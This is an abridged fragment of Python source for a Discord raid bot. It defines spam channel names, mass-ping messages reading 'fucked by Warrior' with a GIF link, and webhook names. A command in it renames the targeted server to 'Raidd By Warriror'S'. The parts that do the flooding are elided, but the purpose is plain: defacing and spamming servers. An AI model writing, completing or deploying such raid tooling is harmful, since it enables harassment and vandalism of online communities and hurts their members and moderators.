...
client = commands.Bot(command_prefix=warriorcodez, intents = discord.Intents.all())
...
CHANNEL_NAMES = ["tejv" , "Warriors-on-top-⛧"]

MESSAGE_CONTENTS = ["@everyone @here fucked by Warrior 🏴‍☠️" , " @everyone @here https://media.discordapp.net/attachments/916987835230334996/1189819267546365972/17037453741388502409509294827371.gif?ex=660e4a8b&is=65fbd58b&hm=6124552edb40c21280141ac74209c03778014768f2b852fc61764edc2cb636f4&" ]

WEBHOOK_NAMES = ['Warrior 🇮🇳']
...
async def tej(ctx, amount=20):
  ...
  await ctx.guild.edit(name="Raidd By Warriror'S 🇮🇳")
